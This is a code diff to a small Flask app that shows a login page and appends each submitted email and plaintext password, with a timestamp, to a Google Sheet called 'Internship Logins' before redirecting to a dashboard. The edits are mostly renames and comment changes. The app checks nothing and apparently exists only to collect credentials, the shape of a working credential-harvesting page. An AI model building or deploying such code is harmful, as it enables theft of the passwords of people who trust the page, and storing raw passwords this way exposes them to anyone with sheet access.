@@ -7,7 +7,7 @@ from oauth2client.service_account import ServiceAccountCredentials
 
 app = Flask(__name__)
 
-# Setup Google Sheets API using credentials from Railway secret
+# Setup Google Sheets API using JSON from environment
 scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
 creds_json = os.environ.get("GOOGLE_CREDS_JSON")
 
@@ -18,20 +18,20 @@ creds_dict = json.loads(creds_json)
 creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
 client = gspread.authorize(creds)
 
-# Open the first sheet
+# Open Google Sheet (first sheet in the doc)
 sheet = client.open("Internship Logins").sheet1
 
 @app.route('/')
-def home():
+def index():
     return render_template('login.html')
 
 @app.route('/login', methods=['POST'])
 def login():
-    email = request.form['email']
-    password = request.form['password']
+    email = request.form.get('email')
+    password = request.form.get('password')
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Append credentials to the sheet
+    # Log credentials to Google Sheet
     sheet.append_row([email, password, timestamp])
 
     return redirect('/dashboard')
@@ -40,6 +40,7 @@ def login():
 def dashboard():
     return render_template('dashboard.html')
 
+# Entry point
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
+    port = int(os.environ.get("PORT", 8080))  # Railway uses this
     app.run(host='0.0.0.0', port=port)
